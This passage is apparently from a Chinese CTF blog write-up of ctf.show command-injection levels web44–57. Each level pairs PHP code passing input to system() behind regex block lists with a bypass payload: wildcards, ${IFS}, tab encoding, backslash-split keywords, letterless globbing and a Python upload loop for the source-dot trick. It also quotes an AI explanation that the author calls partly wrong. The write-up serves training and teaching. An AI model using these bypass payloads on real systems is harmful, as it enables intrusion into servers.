class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​多过滤了 flag，通配符绕过：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac f* ||</span><br></pre></td></tr></table></figure><h1 id="web45"><a class="markdownIt-Anchor" href="#web45">#</a> Web45：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​过滤了空格，老样子，IFS 绕过：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=tac<span class="built_in">$</span>&#123;IFS&#125;fla*||</span><br></pre></td></tr></table></figure><h1 id="web46"><a class="markdownIt-Anchor" href="#web46">#</a> Web46：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​过滤了空格和星号，星号直接用问号绕过，空格使用 %09 绕过：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac<span class="comment">%09fla?.php|| #这里的%09不属于数字</span></span><br></pre></td></tr></table></figure><p>​过滤了空格：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`<span class="comment">%09`(需要php环境)</span></span><br><span class="line">`<span class="built_in">$</span>&#123;IFS&#125;`</span><br><span class="line">`<span class="built_in">$</span>IFS<span class="built_in">$</span>9`</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`<span class="comment">%20`</span></span><br><span class="line">`<span class="comment">%09</span></span><br></pre></td></tr></table></figure><h1 id="web47"><a class="markdownIt-Anchor" href="#web47">#</a> Web47：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​过滤了除了 tac 以外的很大一部分读取文件的操作，flag 也被过滤了，还有空格和星号，绕过方式和上一个一样：</p><blockquote><p>c=tac%09fla?.php||</p></blockquote><h1 id="web48"><a class="markdownIt-Anchor" href="#web48">#</a> Web48：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​不是，怎么多了这么多不认识的命令？</p><p>​不过无所谓，发现还是老样子，tac、管道符和问号没有被过滤，直接无脑冲：</p><blockquote><p>c=tac%09fla?.php||</p></blockquote><h1 id="web49"><a class="markdownIt-Anchor" href="#web49">#</a> Web49：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​没有过滤 tac，但是过滤了百分号，不过这里无伤大雅，因为 %09 不会被当作 %，所以直接</p><blockquote><p>?c=tac%09fla?.php||</p></blockquote><h1 id="web50"><a class="markdownIt-Anchor" href="#web50">#</a> Web50：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​丸辣，过滤了 \x09，没法过了，那就使用 &lt;&gt; 来绕过，不过，&lt;&gt; 和通配符？一起使用的时候不回显，所以用反斜杠绕过关键字 flag：</p><blockquote><p>?c=tac&lt;&gt;fla\g.php||</p></blockquote><h1 id="web51"><a class="markdownIt-Anchor" href="#web51">#</a> Web51：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​靠，tac 被过滤了，不过无所谓，system 函数在某些时候可以用反斜杠来分割关键字，直接一把梭：</p><blockquote><p>?c=ta\c&lt;&gt;fla\g.php||</p></blockquote><h1 id="web52"><a class="markdownIt-Anchor" href="#web52">#</a> Web52：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​丸辣，这里过滤了大小于符号，不过，突然发现好像没有过滤掉 $ 符号，很好，直接 IFS 绕过。</p><blockquote><p>?c=ta\c${IFS}fla\g.php||</p><p>?c=ta\c${IFS}fl’'ag.php||</p></blockquote><p>​不过没有找到 flag，flag 会在哪里呢？在根目录找到了 flag。</p><h1 id="web53"><a class="markdownIt-Anchor" href="#web53">#</a> Web53：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​没啥说的，IFS 绕过一把梭：</p><blockquote><p>?c=ta\c${IFS}fla\g.php</p></blockquote><h1 id="web54"><a class="markdownIt-Anchor" href="#web54">#</a> Web54：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这又是啥正则？ai 的解释如下（部分正确，不可全信）：</p><blockquote><p>这行代码是使用 PHP 的 <code>preg_match</code>  函数来检查一个字符串（假设为变量 <code>$c</code> ）是否包含一系列特定的模式或字符。这些模式通常与尝试绕过安全限制、注入恶意代码或执行不期望的命令有关。下面是对这个正则表达式中各个部分的解释：</p><ol><li><code>\;</code> ：查找分号（ <code>;</code> ），这通常用于命令分隔，在某些情况下可能被用于尝试执行多条命令。</li><li><code>.*c.*a.*t.*</code> ：查找包含 <code>cat</code>  的字符串， <code>cat</code>  是一个常用于 Unix/Linux 系统中查看文件内容的命令。</li><li><code>.*f.*l.*a.*g.*</code> ：查找包含 <code>flag</code>  的字符串，这可能是在尝试获取某种 “标志” 或敏感信息。</li><li><code> [0-9]</code> ：查找空格后跟任何数字，这可能是在尝试绕过基于特定字符的限制。</li><li><code>\*</code> ：查找星号（ <code>*</code> ），在某些上下文中，它可能用于通配符匹配或具有特殊意义。</li><li><code>.*m.*o.*r.*e.*</code> 、 <code>.*w.*g.*e.*t.*</code> 、 <code>.*l.*e.*s.*s.*</code>  等：这些模式分别查找包含 <code>more</code> 、 <code>wget</code> 、 <code>less</code>  等命令的字符串，这些命令通常用于文件操作或数据传输。</li><li><code>.*h.*e.*a.*d.*</code> 、 <code>.*s.*o.*r.*t.*</code> 、 <code>.*t.*a.*i.*l.*</code>  等：查找包含 <code>head</code> 、 <code>sort</code> 、 <code>tail</code>  等 Unix/Linux 命令的字符串，这些命令用于处理文本数据。</li><li><code>.*s.*e.*d.*</code> 、 <code>.*c.*u.*t.*</code> 、 <code>.*t.*a.*c.*</code>  等：查找包含 <code>sed</code> 、 <code>cut</code> 、 <code>tac</code>  等命令的字符串，这些命令用于文本处理。</li><li><code>.*a.*w.*k.*</code> ：查找包含 <code>awk</code>  的字符串， <code>awk</code>  是一个强大的文本处理工具。</li><li><code>.*s.*t.*r.*i.*n.*g.*s.*</code> ：查找包含 <code>strings</code>  的字符串， <code>strings</code>  命令用于提取二进制文件中的可打印字符串。</li><li><code>.*o.*d.*</code> ：查找包含 <code>od</code>  的字符串， <code>od</code> （八进制转储）命令用于以八进制或其他格式转储文件内容。</li><li><code>.*c.*u.*r.*l.*</code> ：查找包含 <code>curl</code>  的字符串， <code>curl</code>  是一个用于传输数据的命令行工具。</li><li><code>.*n.*l.*</code> ：可能意图查找包含 <code>nl</code>  的字符串，但此模式较为宽泛，因为 <code>n</code>  和 <code>l</code>  是常见字母。</li><li><code>.*s.*c.*p.*</code> ：查找包含 <code>scp</code>  的字符串， <code>scp</code>  是安全复制命令，用于在本地和远程之间安全地传输文件。</li><li><code>.*r.*m.*</code> ：查找包含 <code>rm</code>  的字符串， <code>rm</code>  命令用于删除文件或目录。</li><li><code>\</code> 、 <code>%</code> 、 <code>\x09</code> 、 <code>\x26</code> 、 <code>&gt;</code> 、 <code>&lt;</code> ：查找反引号（```）、百分号（ <code>%</code> ）、制表符（ <code>\x09</code> ）、 <code>&amp;</code>  符号的 HTML 实体（ <code>\x26</code> ）、大于号（ <code>&gt;</code> ）、小于号（ <code>&lt;</code> ），这些字符或模式可能在尝试执行命令或注入代码时具有特殊意义。</li></ol><p>整个正则表达式使用了 <code>i</code>  修饰符，表示不区分大小写。如果 <code>preg_match</code>  返回 <code>false</code> （即没有找到匹配项），则意味着字符串 <code>$c</code>  不包含上述任何敏感模式或字符。这通常用于安全检查，以防止潜在的恶意输入。</p></blockquote><p>​这里直接用下面这个方式绕：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=grep$&#123;IFS&#125;<span class="string">&#x27;&#123;&#x27;</span>$&#123;IFS&#125;fl???php</span><br><span class="line">（在 fl???php匹配到的文件中，查找含有&#123;的文件，并打印出包含 &#123; 的这一行）</span><br></pre></td></tr></table></figure><h1 id="web55"><a class="markdownIt-Anchor" href="#web55">#</a> Web55：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​终于到了新玩意儿了，无字母 RCE，有几种方法：<br>查看源代码发现没有过滤数字，我们就想一想在我们查看文件的命令有没有数字开头的。<br>匹配到 /bin 目录下的命令<br> cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64 等<br>发现存在一个 base64<br> 我们就可以通过通配符进行匹配命令执行查看 flag.php<br>payload：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br><span class="line">意思是 /bin/base64 flag.php</span><br></pre></td></tr></table></figure><h1 id="web56"><a class="markdownIt-Anchor" href="#web56">#</a> Web56：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解题思路：过滤了分号，字母，数字等等符号</span><br><span class="line">本题没有过滤符号.(点)，因此可以想到linux中该符号.(点)的用法，与source命令用法相同：linxu中source命令和.(点)</span><br><span class="line">总体分析后，可以post上传一个php文件，内容为所需执行的linux指令，然后使用glob通配符和.(点)来将其中的内容以linux指令的形式来进行执行。</span><br></pre></td></tr></table></figure><p>​还是 system，不过这次多过滤了字母。用下面这个脚本去跑，不过原理不是很清楚，贴一个链接，有条件就去学习一下。</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnNpbmEuY29tLmNuL3MvYmxvZ19hZjY4YTJjMjAxMDE2bmgyLmh0bWw=">LINUX 中的点命令，或 source 命令，或点符号</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS1hZHZhbmNlZC5odG1s">无字母数字 webshell 之提高篇</span></p><p>​python 脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c7ab10d0-d6da-40f4-8e90-c56abda22ce1.challenge.ctf.show/&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;c&quot;</span>:<span class="string">&quot;. /???/????????[@-[]&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;.\\a.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: file&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        r = requests.post(url,params=payload,files=files)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>, end=<span class="string">&#x27; &#x27;</span>,flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>​另外还需要创建一个 a.txt 文件，里面的内容为 cat flag.php</p><h1 id="web57"><a class="markdownIt-Anchor" href="#web57">#</a> Web57：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​这个似乎可以取反做：</p><blockquote><p>在 liunx 中，$(()) 为 0 , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext> </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak"> </span></span></span></span>(()))) 为 - 1 ~<span class="katex"><span class="katex-mathml"><math 